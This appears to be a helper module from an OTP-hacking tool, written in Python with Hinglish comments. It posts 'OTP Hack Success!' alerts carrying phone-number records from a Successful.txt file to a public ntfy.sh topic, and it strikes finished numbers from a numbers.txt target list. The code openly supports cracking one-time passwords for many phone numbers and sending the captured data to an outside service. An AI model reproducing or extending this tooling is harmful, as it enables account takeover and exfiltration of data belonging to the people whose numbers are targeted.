import aiohttp
from urllib.parse import quote

# Apna Ntfy Topic Name yahan daal
NTFY_TOPIC = "otpdataashu"  # <-- Yahan apna sahi topic daal diya

async def send_ntfy_notification(message):
    url = f"https://ntfy.sh/{NTFY_TOPIC}"  # <-- Ab ye automatically url me lag jayega
    headers = {
        "Title": "✅ OTP Hack Success!",
        "Priority": "urgent",
        "Tags": "unlock,success"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=message.encode('utf-8'), headers=headers) as response:
                if response.status == 200:
                    print("[*] Ntfy Notification Bhej Diya!")
                else:
                    print(f"[-] Ntfy Error: {response.status}")
    except Exception as e:
        print(f"[-] Notification bhejte waqt error: {e}")

def get_successful_data(phone_number):
    """Successful.txt me se us specific number ka data nikalega"""
    try:
        with open("Successful.txt", "r") as f:
            lines = f.readlines()
            for line in reversed(lines): # Last line se search karenge
                if line.startswith(str(phone_number)):
                    return line.strip()
        return "Data file me nahi mila"
    except FileNotFoundError:
        return "Successful.txt file nahi mili"

def remove_number_from_list(phone_number, filename="numbers.txt"):
    """Jo number complete ho gaya usko numbers.txt se hata dega"""
    try:
        with open(filename, "r") as f:
            numbers = f.readlines()
        with open(filename, "w") as f:
            for num in numbers:
                if num.strip() != str(phone_number):
                    f.write(num)
    except Exception as e:
        print(f"[-] Number remove karne me error: {e}")